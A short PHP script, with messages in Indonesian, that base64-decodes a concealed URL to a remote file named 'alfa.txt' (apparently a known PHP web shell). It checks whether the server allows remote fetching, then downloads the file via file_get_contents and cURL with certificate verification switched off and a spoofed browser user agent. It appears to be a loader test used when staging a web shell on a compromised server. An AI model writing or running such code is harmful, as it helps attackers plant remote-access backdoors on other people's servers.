<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$base64 = "aHR0cHM6Ly93d3cudGFwZnVzZS5pby9yYXcvYWxmYS50eHQ=";
$url = base64_decode($base64);

echo "<b>Decoded URL:</b> $url<br><br>";

// --- Test allow_url_fopen ---
echo "allow_url_fopen: " . (ini_get("allow_url_fopen") ? "ON" : "OFF") . "<br>";
echo "cURL tersedia: " . (function_exists("curl_init") ? "YA" : "TIDAK") . "<br><br>";

// --- Coba file_get_contents ---
$context = stream_context_create([
    "http" => [
        "method" => "GET",
        "header" => "User-Agent: Mozilla/5.0\r\n"
    ],
    "ssl" => [
        "verify_peer" => false,
        "verify_peer_name" => false,
    ]
]);

$content = @file_get_contents($url, false, $context);

if ($content === false || strlen($content) == 0) {
    echo "<b>file_get_contents gagal!</b><br><br>";
} else {
    echo "<b>file_get_contents berhasil, panjang:</b> " . strlen($content) . " byte<br><br>";
}

// --- Coba cURL fallback ---
if (function_exists("curl_init")) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
    $result = curl_exec($ch);

    if ($result === false) {
        echo "cURL Error: " . curl_error($ch) . "<br>";
    } else {
        echo "<b>cURL berhasil, panjang:</b> " . strlen($result) . " byte<br><br>";
        echo "<pre>" . htmlspecialchars(substr($result, 0, 2000)) . "</pre>";
    }
    curl_close($ch);
} else {
    echo "cURL tidak tersedia di server.<br>";
}
?>
